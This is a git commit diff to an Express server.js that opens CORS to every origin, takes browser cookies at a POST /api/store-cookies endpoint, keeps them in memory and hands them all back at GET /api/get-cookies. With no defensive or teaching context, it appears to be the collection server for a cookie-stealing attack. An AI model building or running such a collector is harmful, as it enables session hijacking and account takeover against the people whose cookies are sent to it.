20923a0ad68b663d1a101b9432f35d4e1579886e
Кто, Ты? Да, Я! <115730229+Ashura-Cyber@users.noreply.github.com>
2024-07-26 03:36:31 +0300

    Add files via upload

--- server.js
+++ server.js
@@ -1,19 +1,18 @@
+// server.js
 const express = require('express');
-const cors = require('cors'); // Подключаем модуль cors
-const path = require('path');
+const cors = require('cors');
+const bodyParser = require('body-parser');
 const app = express();
 const port = 3000;
 
 app.use(cors()); // Разрешаем запросы с других доменов
-app.use(express.json());
+app.use(bodyParser.json()); // Для обработки JSON-данных
 
-// Определите папку для статических файлов
-app.use(express.static(path.join(__dirname, 'public')));
+let userCookies = []; // Массив для хранения куки
 
 // Маршрут для хранения куки
 app.post('/api/store-cookies', (req, res) => {
     const { cookies } = req.body;
-    // Сохраняем куки в массиве (в реальном приложении используйте базу данных)
     userCookies.push(cookies);
     console.log('Cookies stored:', cookies);
     res.json({ status: 'success' });
@@ -24,7 +23,6 @@ app.get('/api/get-cookies', (req, res) => {
     res.json(userCookies);
 });
 
-// Запуск сервера
 app.listen(port, () => {
     console.log(`Server is running on http://localhost:${port}`);
 });
